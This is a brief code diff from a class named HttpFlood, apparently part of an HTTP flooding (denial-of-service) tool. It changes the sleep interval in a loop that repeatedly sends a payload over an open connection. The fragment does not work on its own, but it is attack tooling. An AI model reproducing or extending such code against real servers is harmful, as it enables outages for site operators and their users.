@@ -871,7 +871,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             Tools.send(s, payload)
-            sleep(5.01)
+            sleep(50.01)
             ts = time()
             for _ in range(self._rpc):
                 Tools.send(s, payload)
